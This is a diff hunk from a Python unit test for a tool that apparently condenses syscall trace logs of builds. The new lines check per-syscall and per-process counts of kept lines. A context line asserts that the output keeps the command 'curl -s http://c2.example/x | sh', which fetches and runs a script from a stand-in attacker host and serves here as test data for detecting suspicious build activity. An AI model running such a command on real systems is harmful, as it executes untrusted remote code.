@@ -128,6 +128,11 @@ class FoldTests(unittest.TestCase):
         self.assertEqual(info["counts"]["build start cc"], 9980)
         self.assertIn('"curl -s http://c2.example/x | sh"', out, "a recipe shell naming curl stays")
         self.assertIn('execve("/usr/bin/curl"', out, "curl started inside the build stays")
+        calls = {row[0]: row for row in info["kept_by_call"]}
+        procs = {row[0]: row for row in info["kept_by_proc"]}
+        self.assertIn("execve", calls, "the breakdown counts kept lines by syscall")
+        self.assertIn("sh", procs, "and by process name")
+        self.assertGreater(calls["execve"][2], 0, "with their bytes")
 
     def test_a_long_argv_is_cut_to_512_bytes_with_its_size(self):
         long_args = ", ".join('"-I/work/src/deps/include/%03d"' % i for i in range(80))
